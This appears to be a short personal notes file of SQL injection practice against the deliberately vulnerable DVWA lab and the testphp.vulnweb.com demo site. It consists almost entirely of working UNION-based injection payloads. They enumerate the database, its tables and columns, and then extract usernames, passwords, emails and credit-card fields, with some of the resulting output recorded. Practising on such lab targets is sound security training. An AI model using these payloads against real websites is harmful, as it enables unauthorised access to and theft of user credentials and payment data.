
'''
NOTES

SELECT first_name, last_name FROM users WHERE user_id = ''aaa';
SELECT first_name, last_name FROM users WHERE user_id = '$id';

SELECT first_name, last_name FROM users WHERE user_id = '' UNION select 1,database() #';
SELECT first_name, last_name FROM users WHERE user_id = '' UNION select 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'dvwa' #';
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users' #';
SELECT first_name, last_name FROM users WHERE user_id = '' UNION SELECT user, password FROM users #';

"SELECT a,b,c FROM items WHERE cat = 1 UNION SELECT 1 # ORDER BY id";

http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,database(),8,9,10,11#
acuart
group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'acuart' #';
http://testphp.vulnweb.com/listproducts.php?cat=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,group_concat(table_name) FROM information_schema.tables WHERE table_schema = database() #
artists,carts,categ,featured,guestbook,pictures,products,users
0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users' #
address,cart,cc,email,name,pass,phone,uname
0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'products' #
0 UNION SELECT address,cart,cc,email,name,pass,phone,uname,null,null,null FROM users #
'''

